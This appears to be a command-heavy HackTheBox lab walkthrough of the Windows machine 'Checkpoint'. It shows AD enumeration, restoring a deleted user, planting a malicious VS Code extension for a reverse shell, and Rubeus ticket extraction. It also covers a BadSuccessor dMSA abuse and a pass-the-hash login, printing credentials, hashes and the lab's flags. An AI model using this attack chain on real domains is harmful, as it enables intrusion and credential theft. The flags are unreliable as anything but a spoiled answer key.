
```
┌──(mithun㉿kali)-[~/…/htb/machines/Windows/Checkpoint]
└─$ netexec smb 10.129.164.128 -u 'alex.turner' -p 'Checkpoint2024!' --shares
SMB         10.129.164.128  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.164.128  445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
SMB         10.129.164.128  445    DC01             [*] Enumerated shares
SMB         10.129.164.128  445    DC01             Share           Permissions     Remark
SMB         10.129.164.128  445    DC01             -----           -----------     ------
SMB         10.129.164.128  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.164.128  445    DC01             C$                              Default share
SMB         10.129.164.128  445    DC01             DevDrop         READ            VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.164.128  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.164.128  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.164.128  445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.164.128  445    DC01             VMBackups                       

```

First enumeration , we find the user enumeration 

```
┌──(mithun㉿kali)-[~/…/PassTheCert/Python/evil-vsix/evil-ext]
└─$     rpcclient -U 'checkpoint.htb/alex.turner%Checkpoint2024!' 10.129.108.153 -c "enumdomusers"
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[alex.turner] rid:[0x44d]
user:[ryan.brooks] rid:[0x44f]
user:[svc_deploy] rid:[0x450]
user:[james.harper] rid:[0x457]
user:[sarah.mitchell] rid:[0x458]
user:[emily.carter] rid:[0x459]
user:[david.reynolds] rid:[0x45a]
user:[jessica.coleman] rid:[0x45b]
user:[lauren.flores] rid:[0x45c]
user:[michael.torres] rid:[0x45d]
user:[kevin.patterson] rid:[0x45e]
user:[brian.jenkins] rid:[0x45f]
user:[megan.perry] rid:[0x460]
user:[max.palmer] rid:[0x13ed]

0x44d = 1101 → alex.turner
0x44e = 1102 → [MISSING]  ← gap here!
0x44f = 1103 → ryan.brooks
0x450 = 1104 → svc_deploy
```

So , we find the delete user using LDAP controls
```
┌──(mithun㉿kali)-[~/…/htb/machines/Windows/Checkpoint]
└─$ bloodyAD --host 10.129.108.153 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
get search \
--base 'CN=Deleted Objects,DC=checkpoint,DC=htb' \
-c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 \
--filter '(&(isDeleted=TRUE)(sAMAccountName=mark.davies))' \
--attr distinguishedName,sAMAccountName,lastKnownParent,msDS-LastKnownRDN,isDeleted

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
isDeleted: True
lastKnownParent: OU=Employees,DC=checkpoint,DC=htb
msDS-LastKnownRDN: Mark Davies
sAMAccountName: mark.davies

```

we find the user mark is deleted and then we need to restore it 

```
┌──(mithun㉿kali)-[~/…/htb/machines/Windows/Checkpoint]
└─$ export PATH="$HOME/.local/bin:$PATH"
                                                                                                                                                                                                                                              
┌──(mithun㉿kali)-[~/…/htb/machines/Windows/Checkpoint]
└─$ bloodyAD --host 10.129.108.153 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb' \
--newName mark.davies --newParent 'OU=Employees,DC=checkpoint,DC=htb'
[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=mark.davies,OU=Employees,DC=checkpoint,DC=htb

```

Next we need to check whether the user mark is restored or not :

```
┌──(mithun㉿kali)-[~/…/htb/machines/Windows/Checkpoint]
└─$ bloodyAD --host 10.129.108.153 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
get object mark.davies --attr distinguishedName,sAMAccountName,userAccountControl

distinguishedName: CN=mark.davies,OU=Employees,DC=checkpoint,DC=htb
sAMAccountName: mark.davies
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD

```

```
Mark is restored! Now password reuse and upload vsix:

bash

```bash
# Check password reuse
nxc smb 10.129.108.153 -u mark.davies -p 'Checkpoint2024!'
```

```
┌──(mithun㉿kali)-[~/…/Windows/Checkpoint/PassTheCert/Python]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.114] from (UNKNOWN) [10.129.178.89] 60855
ls


    Directory: C:\Program Files\Microsoft VS Code


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         5/25/2026   6:44 PM                bin                                                                  
d-----         5/25/2026   6:44 PM                f6cfa2ea24                                                           
-a----         5/19/2026  10:32 AM      202610488 Code.exe                                                             
-a----         5/19/2026  10:28 AM            389 Code.VisualElementsManifest.xml                                      
-a----         5/25/2026   6:44 PM        4217912 unins000.dat                                                         
-a----         5/25/2026   6:42 PM        3494720 unins000.exe                                                         
-a----         5/25/2026   6:44 PM          24367 unins000.msg                                                         


PS C:\Program Files\Microsoft VS Code> whoami
checkpoint\ryan.brooks
PS C:\Program Files\Microsoft VS Code> type C:\Users\ryan.brooks\Desktop\user.txt
466f8860887fef0c3078c490a8f7db9b
PS C:\Program Files\Microsoft VS Code> 


                                                                                                                                                                                                                                              
┌──(mithun㉿kali)-[~/…/PassTheCert/Python/evil-vsix/evil-ext]
└─$ smbclient //10.129.178.89/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!' \
  -c 'put evil-ext-0.0.1.vsix'
putting file evil-ext-0.0.1.vsix as \evil-ext-0.0.1.vsix (2.9 kB/s) (average 2.9 kB/s)

```


```
PS C:\Temp> [System.Environment]::OSVersion.Version    

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      26100  0       


PS C:\Temp> Get-ADUser svc_deploy -Properties memberOf | Select-Object DistinguishedName,memberOf

DistinguishedName                                     memberOf
-----------------                                     --------
CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb {}      


PS C:\Temp> (Get-Acl "AD:\CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb").Access | Where-Object { $_.IdentityReference -match 'ryan|DevTeam' } | Select-Object ActiveDirectoryRights,AccessControlType,IdentityReference

ActiveDirectoryRights AccessControlType IdentityReference     
--------------------- ----------------- -----------------     
         GenericWrite             Allow CHECKPOINT\ryan.brooks


PS C:\Temp> Get-ADOrganizationalUnit -Filter * | Select-Object -ExpandProperty DistinguishedName
OU=Domain Controllers,DC=checkpoint,DC=htb
OU=Employees,DC=checkpoint,DC=htb
OU=ServiceAccounts,DC=checkpoint,DC=htb
OU=DMSAHolder,DC=checkpoint,DC=htb
OU=IT,OU=Employees,DC=checkpoint,DC=htb
OU=Finance,OU=Employees,DC=checkpoint,DC=htb
OU=HR,OU=Employees,DC=checkpoint,DC=htb
OU=Engineering,OU=Employees,DC=checkpoint,DC=htb
PS C:\Temp> Get-ADGroupMember BackupAccess | Select-Object Name,objectClass

Name       objectClass
----       -----------
svc_deploy user       

```


```
PS C:\Temp> .\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: stsv91jZFukvY4M20ZFq9fuimC2rNTOryIMbybw3cYY=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuC6oNxCkQBsNiCvmnsx7RJdEhxYsZ11+QZ4NOzOiAC0NSPYjzrerRlVJP8v6qKfPkFqIYim3wCp0K+k2g7re/qGIc2UyIbQGHt1NNoWouMzNGGhnkcc9CG8cvdvhAfhD+xEN4URqgIYJDaD1H0WQVUH9O7sGI7R3S2cfdYjQtz7xkEqDH22Q2H8XTf87alLcuyUOaxOxq/oL7EgU2u1F/gNIOzioUbqcJjGlp5QmObFw1lzNtBJnv9PfMTMxRu1nqRfuUJ2gZEf/BTkKXk5uAJmpkOQ5oa5pMUrbdGaivepv2s3R6eML+N5O6TkiNa9UGn4oImqhFBBAje5Y5nF/FXmEUGQNM9tTC0c9p8bPlEtKYxdZvUheXi6khpN88qb9TciYonBKQ6h1UM/gWP46UEfqWGhJEWKdZy/Gzc+T0YmfkPYttyuO3yxUzunknAsGU3e7xzXzWXvAufIs8BBAxZKK3hwLTDig9dGHp8CuxCRajFtWvL1A6m4Rvp7J6ZSjtkK+IEiQmUCVLLTw1odYY5//D01Ho81Ztz/F0ndVetajhtCHsFDi3lVdgObVVwG5YUNr4TFkL4QLEsqOu8FToi4Izhwt7+xaqADH4eK2uBKX9KDxWe5CLqDHgUGA/stXAJOedNX9ZROpdrG0Y4cCgC9v3fDxFF1018DbzfEl9QjhdK/2JePTVbMMv6yLe8UR28EIJCf0dKb4RoopLTAKQ8XEE9t8BJ2Nt7OZOC3Bl4ZGAcIqTQCqnUsA4umoapoxIOBJQTgQLXqSOtDmu2hCnqWNPmhXA0ZlDtfKl9NK7W9L3k7dv6hexhDiMoqF73sAqHDmrKqjRG8TcSv+fUoVSEn5UXndsTxgQnnWbArbOK3SMNJojWsBEEjcdw7WG0HMlZKu1FZUzdlRaHdtpFOxJyKs6cBOU5knKbva18G2V9NC+yjFNmMjihQ6VxFn6FBgox7dYXvNWV13KYN/drnu8kIMxUAwJRAU7QioNpLl5iKht7xvP14wl16eUffXUSiLToR4rHPDIA1a/sVS1r6lfy+DNxFHQOKZ8FDEl3AVDaCZK3JcoF1Sdrd3tmUya0UACwi2areDX4+O9UPkuipLD20nKYwJwB7EmahffrnjQoOrSFj9qmWJ8Nv8wvITXE01H7FjobBrp6/YKLD1XD7/3xB6zxV8XrtA8lO6xe8VpoD4x5MF5R7N0NEZaTEEBqXqqsdhXxXpCAHHI7CN0CSvGcxu3irMlo5Zv5QOMKnJ5EFfgwH+/Dv4FTW09KmupvG5NPBGvV2LIMVWMFsDJYYccmTwp2ekac801Qmf0Qn88wgIeLFUcQCGLstNtu75cR/9rjgElVHWhwyfUlmSvkuQ2nn2NgRtqvEPHrSj7arQ0mV6n6WDWxTD7KBW49UgAEzlSOusalSNMy+x7WqWZo74Z2b3qCFhDNIcaUrNcT2f5bMVEe6ZfmYxhSgwYKPOdBDojapf3owTfKwB1wgfbuM0V9gIIgUp2sYFmZMER7mwgo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgM7TVhl4XtA/WnFTcspLf57PUHk2dt8pd7MGO8x12cpuhEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDYxNzEyMzUxMlqmERgPMjAyNjA2MTcyMjM1MTJapxEYDzIwMjYwNjI0MTIzNTEyWqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=

```


```
└─$ FT add badSuccessor pwn1 \
-t CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb \
--ou OU=DMSAHolder,DC=checkpoint,DC=htb
/tmp/libfaketime/myvenv/lib/python3.13/site-packages/badldap/wintypes/winerror.py:13895: SyntaxWarning: invalid escape sequence '\<'
  0x80004017: { "code": "CO_E_RUNAS_SYNTAX", "message":"A RunAs specification must be <domain name>\<user name> or simply <user name>."},
/tmp/libfaketime/myvenv/lib/python3.13/site-packages/badldap/wintypes/winerror.py:14071: SyntaxWarning: invalid escape sequence '\<'
  0x8001012C: { "code": "CO_E_WRONGTRUSTEENAMESYNTAX", "message":"One of the trustee strings provided by the user did not conform to the <Domain>\<Name> syntax and it was not the *\" string\"."},
Clock skew detected. Adjusting local time by 0:05:06.762214. Retrying operation.
[+] Creating DMSA pwn1$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
Clock skew detected. Adjusting local time by 0:05:06.926024. Retrying operation.

Realm        : CHECKPOINT.HTB
Sname        : krbtgt/CHECKPOINT.HTB
UserName     : pwn1$
UserRealm    : checkpoint.htb
StartTime    : 2026-06-17 13:35:02+00:00
EndTime      : 2026-06-17 22:35:12+00:00
RenewTill    : 2026-06-24 12:35:12+00:00
Flags        : enc-pa-rep, forwardable, pre-authent, forwarded, renewable
Keytype      : 18
Key          : DJatwRMV2iBoqAJowgvXo7CsyADOSlIYNFt3xr1d15M=
EncodedKirbi : 

    doIFsTCCBa2gAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3Ji
    dGd0Gw5DSEVDS1BPSU5ULkhUQqOCBFYwggRSoAMCARKhAwIBAqKCBEQEggRAlDvdjfEsDRe89I2cYyuGuS2VLDK4k/Y+0bpapRUS
    ZQZWXoMLz3/lnh+IuBER7yL5I0uwGAgzjRSxuCzLoATQ6SyyonubsXdsYfk/qWOVvvDsJ8ndAALBzmuxYiWzAZy8aXnoVnVfn05P
    YhJJz8nqQvHpnI8b7vKU/TnbA5zJUGu5Ond8UUVTTCuU5j7x2K72TsTwnByK+mUtBEvuA1tw4uJGqJBiLfmFL/FY7RNsRwqaYKj1
    3j919E+YUyB1Cr5MB68H8UT+qwDPN1XLY+pTo3Jp16P72XHu09vJBl9kYfrxerbDkFjkDRQndasYac+K29MbkjN/sQPKO4ndwV4u
    dnLuZbP3HaufrFjK0XamGeLXKWPnRdHNcUZvIpEExtdxNyzYKqHzsc6//pcDuHOCwkyqWFoNXmuvTa61BKUUbCXCu6CmDeuwN8A7
    Cav3MIWQ950rvhI2QFRg3uDFJYUoCFCvsHAOwtWqGQhQpZOrvgu2kh5suMXJC80R0wgRNn3n8a61jWuyAUDooXghAPVk5yy9iXBN
    DekJPkOh5/hUj0MGD8c67iN2z28QOfAyChoCpht+1+LymV65EbizxYkK6e1T7BT8/ycfbVT08kk7vTEuussFBdPBO3uNVp3lmcsU
    USfRGuBQoREgL4gdVoIWT67LZ5C9BQltMWo8I9puvc+n6PeGr/EgVqTobF6o9Jlv5CuaTxfiCCNf/zIpId1YHuf4bH9PZZYlOvL/
    LZWPlK5WUpHuKgEX/KGjJ5O/bMcE9oU76ykMsQ369g959z0iOUbyHcwIT9komJIeqIqERkLDVnWVQheTPFuqb+npqIbGPUNNSy4M
    qMHVEAbAvgtz0VC08YHcXNGgbx40f3hnDLW7ax6YNHR58Vj2ZqWmQcKTHjRWrkdSG2Y8AUPy0+K7bkI4KOZg1k/40E3zaaJr2yty
    lW1lHTywPWUXXCNzSvVLtuxOZoHmPcF9a7CYHeOZqRfyhlMOHiytFkWQqcayPbk1bNBUzLXp1ePNtrQOWpsfP5d/dyvZPGdIm+57
    Vvu+GdvRyDX7yWnH+GpnW/WGK6M1FBPP4vuUgNjdskR4wPpDpefL8pHdWOFffT/bnj35UuZRdjlo+4wFEjXbK0FRuUGpm8Txpp2P
    Mu3vFJH9wIum4NjAesMKTn12LB1MbWAuYcTSJsEJvfJZDumgf1h48mCq6d2wwt6mrtgAUJ89rn3IAP1vHwX0UDkakev8MeUBWDEl
    0QcFT2UIArRVrcldDOMAM/LUaIW5EZg+Ut8BHxoFfxJy2n9sMZmspxQSdCZyWsz9jpMr4YflYUfdJypZi1oQxw2DgcNSY/YupNks
    Sdu5zdt+L7IMlB9ucN+jz469pk96CfcvXfrhixxjrk1CNRZ5n0ulGEkWGeord6SP1TnQxb10mtfJXUpk7yb1tAhsbF3V+XkZWDev
    d5QcUTb89gejgfowgfegAwIBAKKB7wSB7H2B6TCB5qCB4zCB4DCB3aArMCmgAwIBEqEiBCAMlq3BExXaIGioAmjCC9ejsKzIAM5K
    Uhg0W3fGvV3Xk6EQGw5jaGVja3BvaW50Lmh0YqISMBCgAwIBAaEJMAcbBXB3bjEkowUDAwBgoaQRGA8yMDI2MDYxNzEyMzUxMlql
    ERgPMjAyNjA2MTcxMzM1MDJaphEYDzIwMjYwNjE3MjIzNTEyWqcRGA8yMDI2MDYyNDEyMzUxMlqoEBsOQ0hFQ0tQT0lOVC5IVEKp
    IzAhoAMCAQKhGjAYGwZrcmJ0Z3QbDkNIRUNLUE9JTlQuSFRC
[+] dMSA TGT stored in ccache file pwn1_Tn.ccache

dMSA current keys found in TGS:
AES256: 5eaf790b12dce11e1c5e8888fa8e018c93d5d428a9a9f2cfd24d2f2de6357d9b
AES128: 7df7be3f0afafd7b9a46556bf9b245ce
RC4: 8b2f4d0d63dc325b19349669e41ba5d5

```

```
└─$ evil-winrm -i 10.129.84.252 -u Administrator -H f29e9c014295b9b32139b09a2790be3b
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
checkpoint\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../
*Evil-WinRM* PS C:\Users\Administrator> find / root.txt 2>/dev/null
Could not find a part of the path 'C:\dev\null'.
At line:1 char:1
+ find / root.txt 2>/dev/null
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
*Evil-WinRM* PS C:\Users\Administrator> type C:\Users\Administrator\Desktop\root.txt
Cannot find path 'C:\Users\Administrator\Desktop\root.txt' because it does not exist.
At line:1 char:1
+ type C:\Users\Administrator\Desktop\root.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Desktop\root.txt:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\Administrator> Get-ChildItem -Path C:\ -Filter "root.txt" -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\max.palmer\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         6/16/2026   2:37 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator> type C:\Users\max.palmer\Desktop\root.txt
17509b3a55de6a16b008c22b1bd56dcb
*Evil-WinRM* PS C:\Users\Administrator> 

```

